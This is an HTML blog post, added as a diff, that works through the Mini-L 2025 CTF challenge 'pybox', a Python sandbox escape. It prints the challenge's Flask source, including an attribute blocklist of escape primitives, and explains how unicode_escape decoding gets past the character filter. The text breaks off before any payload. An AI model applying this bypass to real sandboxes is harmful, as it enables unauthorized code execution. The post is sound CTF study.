@@ -1,0 +1,721 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
+  <link rel="icon" href="/img/logo.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="aidemofashi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Mini-L 2025 web 复现年初打的比赛，做出几道题，但是还有做不出来的，当时没能复现，现在把剩下的题目复现。   pyboxtag: python沙箱逃逸，python继承，AST绕过，suid提权 应该是python沙箱，当前算是知识盲区，现在来当学习一下。   打开界面得到一堆python的码：    让ai注释且整理一下： 12345678910111213141516171819">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mini-L 2025 部分 web 复现">
+<meta property="og:url" content="https://aidemofashi.github.io/2025/11/01/Mini-L/index.html">
+<meta property="og:site_name" content="aidemofashi&#39;s blog">
+<meta property="og:description" content="Mini-L 2025 web 复现年初打的比赛，做出几道题，但是还有做不出来的，当时没能复现，现在把剩下的题目复现。   pyboxtag: python沙箱逃逸，python继承，AST绕过，suid提权 应该是python沙箱，当前算是知识盲区，现在来当学习一下。   打开界面得到一堆python的码：    让ai注释且整理一下： 12345678910111213141516171819">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://notes.gwwafz.online/uploads/2e9d359a-48ed-4c50-ba93-c221730e53b2.png">
+<meta property="og:image" content="http://notes.gwwafz.online/uploads/d3bd3197-bd35-41cb-ae11-26db126245a8.png">
+<meta property="og:image" content="http://notes.gwwafz.online/uploads/ea91ffb1-dc89-4078-b248-332e2a99ad5d.png">
+<meta property="og:image" content="http://notes.gwwafz.online/uploads/d9342d40-1692-4083-9016-a33b038055c7.png">
+<meta property="og:image" content="http://notes.gwwafz.online/uploads/0477f3f5-be46-43ed-8329-cd218fb7d572.png">
+<meta property="article:published_time" content="2025-11-01T15:26:11.000Z">
+<meta property="article:modified_time" content="2025-11-01T15:27:19.731Z">
+<meta property="article:author" content="aidemofashi">
+<meta property="article:tag" content="刷题">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://notes.gwwafz.online/uploads/2e9d359a-48ed-4c50-ba93-c221730e53b2.png">
+  
+  
+  
+  <title>Mini-L 2025 部分 web 复现 - aidemofashi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"aidemofashi.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>aidemofashi&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="http://39.105.15.250/aidemofashi_home/index.html" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/main.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Mini-L 2025 部分 web 复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-01 23:26" pubdate>
+          2025年11月1日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          39 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Mini-L 2025 部分 web 复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Mini-L-2025-web-复现"><a href="#Mini-L-2025-web-复现" class="headerlink" title="Mini-L 2025 web 复现"></a>Mini-L 2025 web 复现</h1><p>年初打的比赛，做出几道题，但是还有做不出来的，当时没能复现，现在把剩下的题目复现。  </p>
+<h2 id="pybox"><a href="#pybox" class="headerlink" title="pybox"></a>pybox</h2><p>tag: python沙箱逃逸，python继承，AST绕过，suid提权</p>
+<p>应该是python沙箱，当前算是知识盲区，现在来当学习一下。  </p>
+<p>打开界面得到一堆python的码：  </p>
+<p><img src="http://notes.gwwafz.online/uploads/2e9d359a-48ed-4c50-ba93-c221730e53b2.png" srcset="/img/loading.gif" lazyload></p>
+<p>让ai注释且整理一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, Response<br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> ast<br><br><br><span class="hljs-comment"># 初始化 Flask 应用</span><br>app = Flask(__name__)<br><br><br><span class="hljs-comment"># ================== 沙箱 AST 访问器类 ==================</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SandboxVisitor</span>(ast.NodeVisitor):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    自定义 AST 访问器，用于静态分析代码结构。</span><br><span class="hljs-string">    禁止访问某些危险属性或使用生成器表达式。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># 黑名单：禁止访问这些特殊属性（可能被用于反射/逃逸）</span><br>    forbidden_attrs = &#123;<br>        <span class="hljs-string">&quot;__class__&quot;</span>,      <span class="hljs-comment"># 防止获取类对象</span><br>        <span class="hljs-string">&quot;__dict__&quot;</span>,       <span class="hljs-comment"># 防止修改命名空间</span><br>        <span class="hljs-string">&quot;__bases__&quot;</span>,      <span class="hljs-comment"># 类继承信息</span><br>        <span class="hljs-string">&quot;__mro__&quot;</span>,        <span class="hljs-comment"># 方法解析顺序</span><br>        <span class="hljs-string">&quot;__subclasses__&quot;</span>, <span class="hljs-comment"># 可用于获取所有类，绕过限制</span><br>        <span class="hljs-string">&quot;__globals__&quot;</span>,    <span class="hljs-comment"># 函数全局变量</span><br>        <span class="hljs-string">&quot;__code__&quot;</span>,       <span class="hljs-comment"># 函数字节码</span><br>        <span class="hljs-string">&quot;__closure__&quot;</span>,    <span class="hljs-comment"># 闭包变量</span><br>        <span class="hljs-string">&quot;__func__&quot;</span>, <span class="hljs-string">&quot;__self__&quot;</span>,     <span class="hljs-comment"># 绑定方法相关</span><br>        <span class="hljs-string">&quot;__module__&quot;</span>,     <span class="hljs-comment"># 模块信息</span><br>        <span class="hljs-string">&quot;__import__&quot;</span>,     <span class="hljs-comment"># 动态导入</span><br>        <span class="hljs-string">&quot;__builtins__&quot;</span>,   <span class="hljs-comment"># 内建命名空间</span><br>        <span class="hljs-string">&quot;__base__&quot;</span>        <span class="hljs-comment"># 基类</span><br>    &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_Attribute</span>(<span class="hljs-params">self, node</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        当遇到属性访问时（如 obj.attr），检查是否为禁止属性。</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node.attr, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">and</span> node.attr <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.forbidden_attrs:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Forbidden attribute access&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.generic_visit(node)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">visit_GeneratorExp</span>(<span class="hljs-params">self, node</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        禁止使用生成器表达式（例如 (x for x in range(10))）</span><br><span class="hljs-string">        因为它可能导致延迟求值或内存消耗过大等问题。</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Generator expressions are not allowed&quot;</span>)<br><br><br><span class="hljs-comment"># ================== 沙箱执行函数 ==================</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sandbox_executor</span>(<span class="hljs-params">code, result_queue</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    在独立进程中执行用户代码的安全函数。</span><br><span class="hljs-string">    使用受限的 globals 和捕获 stdout/stderr 输出。</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    参数：</span><br><span class="hljs-string">        code: 要执行的 Python 代码字符串</span><br><span class="hljs-string">        result_queue: 多进程通信队列，返回结果</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 构造安全的 builtins 子集</span><br>    safe_builtins = &#123;<br>        <span class="hljs-string">&quot;print&quot;</span>: <span class="hljs-built_in">print</span>,<br>        <span class="hljs-string">&quot;filter&quot;</span>: <span class="hljs-built_in">filter</span>,<br>        <span class="hljs-string">&quot;list&quot;</span>: <span class="hljs-built_in">list</span>,<br>        <span class="hljs-string">&quot;len&quot;</span>: <span class="hljs-built_in">len</span>,<br>        <span class="hljs-string">&quot;addaudithook&quot;</span>: sys.addaudithook,  <span class="hljs-comment"># 允许设置审计钩子</span><br>        <span class="hljs-string">&quot;Exception&quot;</span>: Exception,<br>    &#125;<br><br>    <span class="hljs-comment"># 设置干净的 global 命名空间</span><br>    safe_globals = &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: safe_builtins&#125;<br><br>    <span class="hljs-comment"># 重定向标准输出和错误流，以捕获 print 输出</span><br>    sys.stdout = io.StringIO()<br>    sys.stderr = io.StringIO()<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">exec</span>(code, safe_globals)  <span class="hljs-comment"># 执行代码</span><br>        output = sys.stdout.getvalue()   <span class="hljs-comment"># 获取正常输出</span><br>        error = sys.stderr.getvalue()    <span class="hljs-comment"># 获取错误输出</span><br>        result_queue.put((<span class="hljs-string">&quot;ok&quot;</span>, output <span class="hljs-keyword">or</span> error))<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        result_queue.put((<span class="hljs-string">&quot;err&quot;</span>, <span class="hljs-built_in">str</span>(e)))<br><br><br><span class="hljs-comment"># ================== 安全执行主接口 ==================</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_exec</span>(<span class="hljs-params">code: <span class="hljs-built_in">str</span>, timeout=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    安全地执行一段代码，包含超时控制和 AST 检查。</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    步骤：</span><br><span class="hljs-string">    1. 解码 Unicode 转义字符</span><br><span class="hljs-string">    2. 解析语法树并进行 AST 安全检查</span><br><span class="hljs-string">    3. 启动子进程执行代码（避免阻塞主服务）</span><br><span class="hljs-string">    4. 设置超时终止机制</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    返回：执行结果或错误信息</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 处理 Unicode 转义（例如 \u0061 -&gt; &#x27;a&#x27;）</span><br>    code = code.encode().decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>)<br><br>    <span class="hljs-comment"># 解析成抽象语法树（AST）</span><br>    tree = ast.parse(code)<br><br>    <span class="hljs-comment"># 使用自定义访问器检查 AST 是否包含非法操作</span><br>    <span class="hljs-keyword">try</span>:<br>        SandboxVisitor().visit(tree)<br>    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: Suspicious code detected during AST analysis.&quot;</span><br><br>    <span class="hljs-comment"># 创建多进程队列用于接收执行结果</span><br>    result_queue = multiprocessing.Queue()<br><br>    <span class="hljs-comment"># 启动子进程执行代码（隔离运行环境）</span><br>    p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue))<br>    p.start()<br>    p.join(timeout=timeout)  <span class="hljs-comment"># 最多等待 timeout 秒</span><br><br>    <span class="hljs-comment"># 超时处理</span><br>    <span class="hljs-keyword">if</span> p.is_alive():<br>        p.terminate()  <span class="hljs-comment"># 强制终止进程</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Timeout: code took too long to run.&quot;</span><br><br>    <span class="hljs-comment"># 尝试获取执行结果</span><br>    <span class="hljs-keyword">try</span>:<br>        status, output = result_queue.get_nowait()<br>        <span class="hljs-keyword">return</span> output <span class="hljs-keyword">if</span> status == <span class="hljs-string">&quot;ok&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;output&#125;</span>&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error: no output from sandbox.&quot;</span><br><br><br><span class="hljs-comment"># ================== 用户代码模板 ==================</span><br><span class="hljs-comment"># 注入点：&#123;text&#125; 将被替换为用户输入</span><br>CODE = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">def my_audit_checker(event, args):</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    审计钩子函数：监控系统事件，仅允许特定行为。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    allowed_events = [</span><br><span class="hljs-string">        &quot;import&quot;,             # 允许 import 触发（但不会真正导入）</span><br><span class="hljs-string">        &quot;time.sleep&quot;,         # 允许 sleep（但会被拦截）</span><br><span class="hljs-string">        &quot;builtins.input&quot;,     # 允许 input 调用</span><br><span class="hljs-string">        &quot;builtins.input/result&quot;  # 允许 input 返回值</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">    # 检查事件是否在白名单中</span><br><span class="hljs-string">    if event not in allowed_events:</span><br><span class="hljs-string">        raise Exception(f&quot;Audit denied: &#123;event&#125;&quot;)</span><br><span class="hljs-string">    # 不允许传参（args 必须为空）</span><br><span class="hljs-string">    if len(args) &gt; 0:</span><br><span class="hljs-string">        raise Exception(&quot;Arguments not allowed in audit events&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 注册审计钩子（Python 3.8+ 支持）</span><br><span class="hljs-string">addaudithook(my_audit_checker)</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 打印用户输入内容</span><br><span class="hljs-string">print(&quot;&#123;&#125;&quot;)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-comment"># 禁止出现在用户输入中的特殊字符</span><br>badchars = <span class="hljs-string">&quot;\&quot;&#x27;|&amp;`+-*/()[]&#123;&#125;_.&quot;</span>  <span class="hljs-comment"># 包括引号、管道、运算符、括号等</span><br><br><br><span class="hljs-comment"># ================== Flask 路由 ==================</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    主页：返回当前文件源码（自我展示）</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>).read()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/execute&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    执行端点：接收表单字段 &#x27;text&#x27;，进行过滤后执行。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    text = request.form.get(<span class="hljs-string">&#x27;text&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>    <span class="hljs-comment"># 1. 字符黑名单检查</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> badchars:<br>        <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Error&quot;</span>, status=<span class="hljs-number">400</span>)<br><br>    <span class="hljs-comment"># 2. 将用户输入填入模板并执行</span><br>    output = safe_exec(CODE.<span class="hljs-built_in">format</span>(text))<br><br>    <span class="hljs-comment"># 3. 输出长度限制（防泄露过多信息？或隐藏真实输出？）</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(output) &gt; <span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Error&quot;</span>, status=<span class="hljs-number">400</span>)<br><br>    <span class="hljs-comment"># 4. 返回执行结果</span><br>    <span class="hljs-keyword">return</span> Response(output, status=<span class="hljs-number">200</span>)<br><br><br><span class="hljs-comment"># ================== 启动应用 ==================</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)  <span class="hljs-comment"># 监听所有网络接口</span><br></code></pre></td></tr></table></figure>
+
+<p>尝试用fenjing无果，让ai给出可能的方向，撇了一眼wp，说是用unicode绕过  </p>
+<p>关键代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 处理 Unicode 转义（例如 \u0061 -&gt; &#x27;a&#x27;）</span><br>code = code.encode().decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>然后这里就是ssti加py沙箱逃逸，这个得单独终点学学，只能先看wp打。</strong></p>
+<p>有几个需要突破的点：  </p>
+<p>post检查环节，黑名单绕过：  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">badchars = <span class="hljs-string">&quot;\&quot;&#x27;|&amp;`+-*/()[]&#123;&#125;_.&quot;</span> <br><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> badchars:<br>    <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> text:<br>    <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;Error&quot;</span>, status=<span class="hljs-number">400</span>)<br></code></pre></td></tr></table></figure>
+
+<p>利用点：  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">code = code.encode().decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p>在进入 safe_exec 前会被unicode_escape解码，<br>这样我们传入被unicode_escape编码的字符就能绕过post阶段的检查  </p>
+<p>接下来需要逃出它的执行模板:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON">CODE = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">def my_audit_checker(event, args):</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    审计钩子函数：监控系统事件，仅允许特定行为。</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><span class="hljs-string">    allowed_events = [</span><br><span class="hljs-string">        &quot;import&quot;,             # 允许 